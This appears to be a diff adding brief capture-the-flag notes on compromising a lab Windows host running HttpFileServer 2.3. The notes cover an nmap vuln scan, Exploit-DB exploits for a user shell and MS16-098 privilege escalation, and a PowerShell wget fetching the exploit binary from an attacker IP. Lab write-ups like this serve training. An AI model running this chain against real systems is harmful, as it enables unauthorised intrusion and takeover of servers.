@@ -1,0 +1,11 @@
+1.nmap scan -->  nmap -p- -sV -T4 --script vuln 10.10.10.8
+2.Accessing oirt 80 first
+3.version --> HttpFileServer httpd 2.3
+4.Googling it and found this --> https://www.exploit-db.com/exploits/39161
+5.changing LPORT and LHOST in the script.
+6. In the script it's mentioned to host nc.exe on port 80 locally.
+7.got user shell
+8.using windows exploit suggester --> https://github.com/AonCyberLabs/Windows-Exploit-Suggester
+9.using exploit --> MS16-098--> https://www.exploit-db.com/exploits/41020 --> downloading exe --> https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/41020.exe
+10.using powershell to download it --> powershell wget http://10.10.14.7/41020.exe -outfile privesc.exe
+
